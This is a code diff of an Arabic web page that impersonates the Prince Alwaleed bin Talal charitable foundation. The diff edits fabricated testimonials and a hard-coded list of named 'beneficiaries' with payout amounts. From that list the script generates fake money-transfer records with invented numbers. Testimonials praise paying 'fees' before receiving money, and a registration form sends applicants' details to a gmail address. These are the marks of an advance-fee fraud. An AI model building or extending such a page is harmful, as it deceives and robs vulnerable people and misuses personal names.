@@ -1133,7 +1133,7 @@
         { name: "أماني ناصر", country: "🇹🇳 تونس", text: "شكراً وصلني المبلغ، بالله سرعة الإنجاز خلتني نصدق فيهم." },
         { name: "زياد بن علي", country: "🇱🇾 ليبيا", text: "والله استلمت المبلغ كامل، مافيش أي نقص." },
         { name: "سامية بوشوشة", country: "🇩🇿 الجزائر", text: "شكراً والله وصلني، ربي يبارك فيكم." },
-        { name: "رشيد الفاسi", country: "🇲🇦 المغرب", text: "أية والله مؤسسة محترمة، دفعت الرسوم ووصلني المبلغ فوراً." },
+        { name: "رشيد الفاسي", country: "🇲🇦 المغرب", text: "أية والله مؤسسة محترمة، دفعت الرسوم ووصلني المبلغ فوراً." },
         { name: "مها عبدالله", country: "🇸🇩 السودان", text: "الحمدلله استلمت، والله إنهم ناس أمناء." },
         { name: "جمانة حيدر", country: "🇱🇧 لبنان", text: "شكراً وصلني المبلغ ياناس، والله فرحت كتير." },
         { name: "فهد العتيبي", country: "🇸🇦 السعودية", text: "والله انا استلمت المبلغ، والخدمة خرافية." },
@@ -1211,73 +1211,86 @@
         window.location.href = `mailto:compny71@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
         alert('✅ تم إرسال طلب التسجيل بنجاح! سيتم التواصل معك قريباً.');
         document.getElementById('regFormMain').reset();
-    }// ---------- المستفيدين مع المبالغ المخصصة ----------
-const beneficiaries = [
-    // ===== المستفيدين الأساسيين (17) =====
-    { name: "احمد محمد حسان احمد", amount: 14000 },
-    { name: "هواري خالد عبدالقادر بوجناح", amount: 14000 },
-    { name: "احمد مهيوب محمد غالب", amount: 14000 },
-    { name: "عبدالمجيد علي ناصر العلاني", amount: 14000 },
-    { name: "ناصر محسن الحاجي", amount: 14000 },
-    { name: "خليفي محمد الطيب", amount: 14000 },
-    { name: "حسام الدين فتحي شاكر محمود", amount: 14000 },
-    { name: "العربي غريب يوسف محمد القزاز", amount: 21333 },
-    { name: "محمود محمد علوى الحضرى", amount: 14000 },
-    { name: "منير أحمد الخلف", amount: 150000 },
-    { name: "بهيه حسين شريف", amount: 150000 },
-    { name: "راوية حسن محمد بابكر", amount: 150000 },
-    { name: "امل ياسين الحسن", amount: 150000 },
-    { name: "انتصار محمود محاميد", amount: 150000 },
-    { name: "مها رياض حلاق", amount: 100000 },
-    { name: "خليل عسي خضر", amount: 50000 },
-    { name: "عبدالفتاح السيد البرادعي", amount: 50000 },
-    
-    // ===== المستفيدين الإضافيين (7) =====
-    { name: "كوثر فهمي محمد مرسى", amount: 50000 },
-    { name: "محمد مازن محمود حتحت", amount: 50000 },
-    { name: "أحمد علي عبدالعزيز منصور", amount: 50000 },
-    { name: "عبود صطوف محمد الملك", amount: 50000 },
-    { name: "خالد فايز الهديهد", amount: 50000 },
-    { name: "غاليه محمود الابراهيم", amount: 50000 },
-    { name: "محمد احمد هادي غيثان", amount: 50000 },
-    
-    // ===== المستفيدين الجدد (10) =====
-    { name: "مي حسين ادم سعيد", amount: 150000 },
-    { name: "محمد جمال تاج الدين محمد", amount: 150000 },
-    { name: "عبدالله مخشان", amount: 150000 },
-    { name: "محمود الأطروح", amount: 150000 },
-    { name: "ميلود الأطرش", amount: 150000 },
-    { name: "عماد طالة", amount: 150000 },
-    { name: "إبراهيم محمد ادم ابكر", amount: 150000 },
-    { name: "مؤيد عاطف عبدالله عبد الواحد", amount: 150000 },
-    { name: "ظافر حنوش يعقوب حسن الراوي", amount: 150000 },
-    { name: "عبد الرزاق سند مجبل ياس المحمدي", amount: 150000 }
-];
+    }
 
-// ===== إنشاء الحوالات (تبدأ من 1155405) =====
-const transfers = [];
-const senderName = "الوليد بن طلال آل سعود";
-const startNumber = 1155405;
+    // ============================================================
+    // ===== 📋 قائمة المستفيدين - أضف اسم المستفيد الجديد هنا =====
+    // ============================================================
+    // ⚠️ instructions:
+    // 1. انسخ السطر التالي وألصقه داخل المصفوفة []
+    // 2. غيّر "الاسم" و amount
+    // مثال: { name: "اسم المستفيد", amount: 50000 },
+    // ============================================================
 
-beneficiaries.forEach((item, index) => {
-    const number = String(startNumber + index);
-    transfers.push({
-        number: number,
-        sender: senderName,
-        receiver: item.name,
-        amount: item.amount,
-        date: new Date().toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' })
-    });
-});
+    const newBeneficiaries = [
+        // أضف المستفيدين الجدد هنا 👇
+        // { name: "اسم المستفيد", amount: 50000 },
+    ];
 
-console.log('✅ عدد المستفيدين:', beneficiaries.length);
-console.log('📋 أرقام الحوالات:', transfers.map(t => t.number).join(', '));
+    // ===== دمج المستفيدين الجدد مع القائمة الأساسية =====
+    const baseBeneficiaries = [
+        { name: "احمد محمد حسان احمد", amount: 14000 },
+        { name: "هواري خالد عبدالقادر بوجناح", amount: 14000 },
+        { name: "احمد مهيوب محمد غالب", amount: 14000 },
+        { name: "عبدالمجيد علي ناصر العلاني", amount: 14000 },
+        { name: "ناصر محسن الحاجي", amount: 14000 },
+        { name: "خليفي محمد الطيب", amount: 14000 },
+        { name: "حسام الدين فتحي شاكر محمود", amount: 14000 },
+        { name: "العربي غريب يوسف محمد القزاز", amount: 21333 },
+        { name: "محمود محمد علوى الحضرى", amount: 14000 },
+        { name: "منير أحمد الخلف", amount: 150000 },
+        { name: "بهيه حسين شريف", amount: 150000 },
+        { name: "راوية حسن محمد بابكر", amount: 150000 },
+        { name: "امل ياسين الحسن", amount: 150000 },
+        { name: "انتصار محمود محاميد", amount: 150000 },
+        { name: "مها رياض حلاق", amount: 100000 },
+        { name: "خليل عسي خضر", amount: 50000 },
+        { name: "عبدالفتاح السيد البرادعي", amount: 50000 },
+        { name: "كوثر فهمي محمد مرسى", amount: 50000 },
+        { name: "محمد مازن محمود حتحت", amount: 50000 },
+        { name: "أحمد علي عبدالعزيز منصور", amount: 50000 },
+        { name: "عبود صطوف محمد الملك", amount: 50000 },
+        { name: "خالد فايز الهديهد", amount: 50000 },
+        { name: "غاليه محمود الابراهيم", amount: 50000 },
+        { name: "محمد احمد هادي غيثان", amount: 50000 },
+        { name: "مي حسين ادم سعيد", amount: 150000 },
+        { name: "محمد جمال تاج الدين محمد", amount: 150000 },
+        { name: "عبدالله مخشان", amount: 150000 },
+        { name: "محمود الأطروح", amount: 150000 },
+        { name: "ميلود الأطرش", amount: 150000 },
+        { name: "عماد طالة", amount: 150000 },
+        { name: "إبراهيم محمد ادم ابكر", amount: 150000 },
+        { name: "مؤيد عاطف عبدالله عبد الواحد", amount: 150000 },
+        { name: "ظافر حنوش يعقوب حسن الراوي", amount: 150000 },
+        { name: "عبد الرزاق سند مجبل ياس المحمدي", amount: 150000 },
+        { name: "أشرف محمد أحمد قطايف", amount: 150000 },
+        { name: "رجب بدر عبدالسلام عبدالحليم", amount: 150000 },
+        { name: "محمد احمد مصطفى", amount: 150000 }
+    ];
+
+    // ===== دمج القوائم =====
+    const beneficiaries = [...baseBeneficiaries, ...newBeneficiaries];
+
+    // ===== إنشاء الحوالات =====
+    const transfers = [];
+    const senderName = "الوليد بن طلال آل سعود";
+    const startNumber = 1155405;
+
+    beneficiaries.forEach((item, index) => {
+        const number = String(startNumber + index);
+        transfers.push({
+            number: number,
+            sender: senderName,
+            receiver: item.name,
+            amount: item.amount,
+            date: new Date().toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' })
         });
     });
 
     // ===== DISPLAY BENEFICIARIES =====
     function displayBeneficiaries() {
         const list = document.getElementById('beneficiariesList');
+        if (!list) return;
         list.innerHTML = '';
         const shuffled = [...beneficiaries].sort(() => Math.random() - 0.5);
         const display = shuffled.slice(0, 10);
@@ -1352,6 +1365,7 @@ console.log('📋 أرقام الحوالات:', transfers.map(t => t.number).jo
     }, 8000);
 
     console.log('✅ الصفحة الرسمية لمؤسسة الأمير الوليد بن طلال الخيرية - تم التحديث الكامل');
+    console.log('📋 عدد المستفيدين:', beneficiaries.length);
     console.log('📋 أرقام الحوالات:', transfers.map(t => t.number).join(', '));
 </script>
 
